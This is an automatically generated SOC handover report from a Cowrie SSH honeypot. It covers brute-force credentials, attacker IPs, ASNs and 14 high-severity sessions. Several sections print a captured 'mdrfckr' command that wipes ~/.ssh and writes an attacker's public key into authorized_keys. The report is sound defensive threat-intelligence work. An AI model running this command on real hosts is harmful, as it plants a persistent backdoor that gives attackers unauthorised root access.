# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-25 |
| **Generated At** | 2026-03-25T22:34:34Z |
| **Shift Time** | 22:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **174** |
| Confirmed Threats | **70** |
| False Positives Filtered | **104** (59.8%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **17** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **160** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **59** |
| Unique Credential Pairs | **28** |
| Unique Usernames | **23** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 6 |
| `leon` | 5 |
| `superadmin` | 5 |
| `postgres` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `12345` | 6 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `password` | 5 |
| `0000` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `leon` | `12345` | 5 |
| `superadmin` | `password` | 5 |
| `postgres` | `0000` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `steven` | `120.62.8.17` | 2026-03-25T20:56:28 |
| `root` | `3245gs5662d34` | `120.62.8.17` | 2026-03-25T20:56:29 |
| `root` | `steven` | `47.88.49.190` | 2026-03-25T20:57:30 |
| `root` | `3245gs5662d34` | `47.88.49.190` | 2026-03-25T20:57:35 |
| `root` | `steven` | `8.222.187.152` | 2026-03-25T20:58:04 |
| `root` | `3245gs5662d34` | `8.222.187.152` | 2026-03-25T20:58:07 |
| `root` | `steven` | `47.238.164.111` | 2026-03-25T20:58:10 |
| `root` | `3245gs5662d34` | `47.238.164.111` | 2026-03-25T20:58:13 |
| `root` | `toto` | `172.174.72.225` | 2026-03-25T20:58:29 |
| `root` | `3245gs5662d34` | `172.174.72.225` | 2026-03-25T20:58:34 |
| `root` | `steven` | `47.237.90.197` | 2026-03-25T20:58:44 |
| `root` | `3245gs5662d34` | `47.237.90.197` | 2026-03-25T20:58:47 |
| `root` | `abcd123` | `47.83.161.4` | 2026-03-25T20:59:19 |
| `root` | `w123456` | `47.83.161.4` | 2026-03-25T21:01:51 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `47.238.164.111`, `8.222.187.152`, `172.174.72.225`, `47.237.90.197`, `120.62.8.17`, `47.88.49.190`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **27** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS45899` | VNPT Corp | 1 | LOW |
| `AS267788` | IP TECHNOLOGIES S.A.S. | 1 | HIGH |
| `AS21499` | Host Europe GmbH | 1 | HIGH |
| `AS7311` | Frontier Networks Inc | 1 | LOW |
| `AS17421` | Mobile Business Group | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1a02131a149f

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-25 20:56 |
| **Last Seen** | 2026-03-25 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:56:28` | `cowrie.session.connect` |
| `2026-03-25 20:56:28` | `cowrie.client.version` |
| `2026-03-25 20:56:28` | `cowrie.client.kex` |
| `2026-03-25 20:56:28` | `cowrie.login.success` |
| `2026-03-25 20:56:28` | `cowrie.session.params` |
| `2026-03-25 20:56:28` | `cowrie.command.input` |
| `2026-03-25 20:56:28` | `cowrie.command.failed` |
| `2026-03-25 20:56:28` | `cowrie.log.closed` |
| `2026-03-25 20:56:28` | `cowrie.session.params` |
| `2026-03-25 20:56:28` | `cowrie.command.input` |
| `2026-03-25 20:56:28` | `cowrie.session.file_download` |
| `2026-03-25 20:56:28` | `cowrie.log.closed` |
| `2026-03-25 20:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2df2bcf7ff92

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-25 20:56 |
| **Last Seen** | 2026-03-25 20:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:56:29` | `cowrie.session.connect` |
| `2026-03-25 20:56:29` | `cowrie.client.version` |
| `2026-03-25 20:56:29` | `cowrie.client.kex` |
| `2026-03-25 20:56:29` | `cowrie.login.success` |
| `2026-03-25 20:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d6312981bf

| Field | Detail |
|---|---|
| **Source IP** | `47.88.49[.]190` |
| **First Seen** | 2026-03-25 20:57 |
| **Last Seen** | 2026-03-25 20:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:57:28` | `cowrie.session.connect` |
| `2026-03-25 20:57:28` | `cowrie.client.version` |
| `2026-03-25 20:57:29` | `cowrie.client.kex` |
| `2026-03-25 20:57:30` | `cowrie.login.success` |
| `2026-03-25 20:57:30` | `cowrie.session.params` |
| `2026-03-25 20:57:30` | `cowrie.command.input` |
| `2026-03-25 20:57:30` | `cowrie.command.failed` |
| `2026-03-25 20:57:30` | `cowrie.log.closed` |
| `2026-03-25 20:57:31` | `cowrie.session.params` |
| `2026-03-25 20:57:31` | `cowrie.command.input` |
| `2026-03-25 20:57:31` | `cowrie.session.file_download` |
| `2026-03-25 20:57:31` | `cowrie.log.closed` |
| `2026-03-25 20:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.88.49[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.88.49[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0f305caa47c

| Field | Detail |
|---|---|
| **Source IP** | `47.88.49[.]190` |
| **First Seen** | 2026-03-25 20:57 |
| **Last Seen** | 2026-03-25 20:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:57:34` | `cowrie.session.connect` |
| `2026-03-25 20:57:34` | `cowrie.client.version` |
| `2026-03-25 20:57:34` | `cowrie.client.kex` |
| `2026-03-25 20:57:35` | `cowrie.login.success` |
| `2026-03-25 20:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.88.49[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.88.49[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f7d681f10bb

| Field | Detail |
|---|---|
| **Source IP** | `8.222.187[.]152` |
| **First Seen** | 2026-03-25 20:58 |
| **Last Seen** | 2026-03-25 20:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:58:04` | `cowrie.session.connect` |
| `2026-03-25 20:58:04` | `cowrie.client.version` |
| `2026-03-25 20:58:04` | `cowrie.client.kex` |
| `2026-03-25 20:58:04` | `cowrie.login.success` |
| `2026-03-25 20:58:04` | `cowrie.session.params` |
| `2026-03-25 20:58:04` | `cowrie.command.input` |
| `2026-03-25 20:58:04` | `cowrie.command.failed` |
| `2026-03-25 20:58:04` | `cowrie.log.closed` |
| `2026-03-25 20:58:05` | `cowrie.session.params` |
| `2026-03-25 20:58:05` | `cowrie.command.input` |
| `2026-03-25 20:58:05` | `cowrie.session.file_download` |
| `2026-03-25 20:58:05` | `cowrie.log.closed` |
| `2026-03-25 20:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.187[.]152` to AbuseIPDB if not already reported
- [ ] Block `8.222.187[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8bb6c1a2e35

| Field | Detail |
|---|---|
| **Source IP** | `8.222.187[.]152` |
| **First Seen** | 2026-03-25 20:58 |
| **Last Seen** | 2026-03-25 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:58:06` | `cowrie.session.connect` |
| `2026-03-25 20:58:06` | `cowrie.client.version` |
| `2026-03-25 20:58:06` | `cowrie.client.kex` |
| `2026-03-25 20:58:07` | `cowrie.login.success` |
| `2026-03-25 20:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.187[.]152` to AbuseIPDB if not already reported
- [ ] Block `8.222.187[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58cd9c510078

| Field | Detail |
|---|---|
| **Source IP** | `47.238.164[.]111` |
| **First Seen** | 2026-03-25 20:58 |
| **Last Seen** | 2026-03-25 20:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:58:09` | `cowrie.session.connect` |
| `2026-03-25 20:58:09` | `cowrie.client.version` |
| `2026-03-25 20:58:09` | `cowrie.client.kex` |
| `2026-03-25 20:58:10` | `cowrie.login.success` |
| `2026-03-25 20:58:10` | `cowrie.session.params` |
| `2026-03-25 20:58:10` | `cowrie.command.input` |
| `2026-03-25 20:58:10` | `cowrie.command.failed` |
| `2026-03-25 20:58:10` | `cowrie.log.closed` |
| `2026-03-25 20:58:10` | `cowrie.session.params` |
| `2026-03-25 20:58:10` | `cowrie.command.input` |
| `2026-03-25 20:58:10` | `cowrie.session.file_download` |
| `2026-03-25 20:58:10` | `cowrie.log.closed` |
| `2026-03-25 20:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.164[.]111` to AbuseIPDB if not already reported
- [ ] Block `47.238.164[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c12086873831

| Field | Detail |
|---|---|
| **Source IP** | `47.238.164[.]111` |
| **First Seen** | 2026-03-25 20:58 |
| **Last Seen** | 2026-03-25 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:58:12` | `cowrie.session.connect` |
| `2026-03-25 20:58:12` | `cowrie.client.version` |
| `2026-03-25 20:58:12` | `cowrie.client.kex` |
| `2026-03-25 20:58:13` | `cowrie.login.success` |
| `2026-03-25 20:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.164[.]111` to AbuseIPDB if not already reported
- [ ] Block `47.238.164[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af9e6bb82cbb

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-03-25 20:58 |
| **Last Seen** | 2026-03-25 20:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:58:28` | `cowrie.session.connect` |
| `2026-03-25 20:58:28` | `cowrie.client.version` |
| `2026-03-25 20:58:28` | `cowrie.client.kex` |
| `2026-03-25 20:58:29` | `cowrie.login.success` |
| `2026-03-25 20:58:29` | `cowrie.session.params` |
| `2026-03-25 20:58:29` | `cowrie.command.input` |
| `2026-03-25 20:58:29` | `cowrie.command.failed` |
| `2026-03-25 20:58:29` | `cowrie.log.closed` |
| `2026-03-25 20:58:30` | `cowrie.session.params` |
| `2026-03-25 20:58:30` | `cowrie.command.input` |
| `2026-03-25 20:58:30` | `cowrie.session.file_download` |
| `2026-03-25 20:58:30` | `cowrie.log.closed` |
| `2026-03-25 20:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e056f77e70

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-03-25 20:58 |
| **Last Seen** | 2026-03-25 20:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:58:33` | `cowrie.session.connect` |
| `2026-03-25 20:58:33` | `cowrie.client.version` |
| `2026-03-25 20:58:33` | `cowrie.client.kex` |
| `2026-03-25 20:58:34` | `cowrie.login.success` |
| `2026-03-25 20:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2f4af8b0865

| Field | Detail |
|---|---|
| **Source IP** | `47.237.90[.]197` |
| **First Seen** | 2026-03-25 20:58 |
| **Last Seen** | 2026-03-25 20:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:58:44` | `cowrie.session.connect` |
| `2026-03-25 20:58:44` | `cowrie.client.version` |
| `2026-03-25 20:58:44` | `cowrie.client.kex` |
| `2026-03-25 20:58:44` | `cowrie.login.success` |
| `2026-03-25 20:58:45` | `cowrie.session.params` |
| `2026-03-25 20:58:45` | `cowrie.command.input` |
| `2026-03-25 20:58:45` | `cowrie.command.failed` |
| `2026-03-25 20:58:45` | `cowrie.log.closed` |
| `2026-03-25 20:58:45` | `cowrie.session.params` |
| `2026-03-25 20:58:45` | `cowrie.command.input` |
| `2026-03-25 20:58:45` | `cowrie.session.file_download` |
| `2026-03-25 20:58:45` | `cowrie.log.closed` |
| `2026-03-25 20:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.90[.]197` to AbuseIPDB if not already reported
- [ ] Block `47.237.90[.]197` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88b43b82f45

| Field | Detail |
|---|---|
| **Source IP** | `47.237.90[.]197` |
| **First Seen** | 2026-03-25 20:58 |
| **Last Seen** | 2026-03-25 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:58:47` | `cowrie.session.connect` |
| `2026-03-25 20:58:47` | `cowrie.client.version` |
| `2026-03-25 20:58:47` | `cowrie.client.kex` |
| `2026-03-25 20:58:47` | `cowrie.login.success` |
| `2026-03-25 20:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.90[.]197` to AbuseIPDB if not already reported
- [ ] Block `47.237.90[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c01ce24de53f

| Field | Detail |
|---|---|
| **Source IP** | `47.83.161[.]4` |
| **First Seen** | 2026-03-25 20:59 |
| **Last Seen** | 2026-03-25 20:59 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:59:08` | `cowrie.session.connect` |
| `2026-03-25 20:59:11` | `cowrie.client.version` |
| `2026-03-25 20:59:11` | `cowrie.client.kex` |
| `2026-03-25 20:59:19` | `cowrie.login.success` |
| `2026-03-25 20:59:24` | `cowrie.session.params` |
| `2026-03-25 20:59:24` | `cowrie.command.input` |
| `2026-03-25 20:59:26` | `cowrie.log.closed` |
| `2026-03-25 20:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.161[.]4` to AbuseIPDB if not already reported
- [ ] Block `47.83.161[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-452e4a943a1d

| Field | Detail |
|---|---|
| **Source IP** | `47.83.161[.]4` |
| **First Seen** | 2026-03-25 21:01 |
| **Last Seen** | 2026-03-25 21:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 21:01:48` | `cowrie.session.connect` |
| `2026-03-25 21:01:48` | `cowrie.client.version` |
| `2026-03-25 21:01:48` | `cowrie.client.kex` |
| `2026-03-25 21:01:51` | `cowrie.login.success` |
| `2026-03-25 21:01:52` | `cowrie.session.params` |
| `2026-03-25 21:01:52` | `cowrie.command.input` |
| `2026-03-25 21:01:53` | `cowrie.log.closed` |
| `2026-03-25 21:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.161[.]4` to AbuseIPDB if not already reported
- [ ] Block `47.83.161[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.62.8[.]17` | **5** | 2026-03-25 20:52 | 2026-03-25 20:56 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `172.174.72[.]225` | **5** | 2026-03-25 20:51 | 2026-03-25 21:00 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `47.237.90[.]197` | **5** | 2026-03-25 20:47 | 2026-03-25 20:59 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `47.238.164[.]111` | **5** | 2026-03-25 20:47 | 2026-03-25 21:00 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `47.88.49[.]190` | **5** | 2026-03-25 20:50 | 2026-03-25 21:00 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `8.222.187[.]152` | **5** | 2026-03-25 20:47 | 2026-03-25 20:59 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
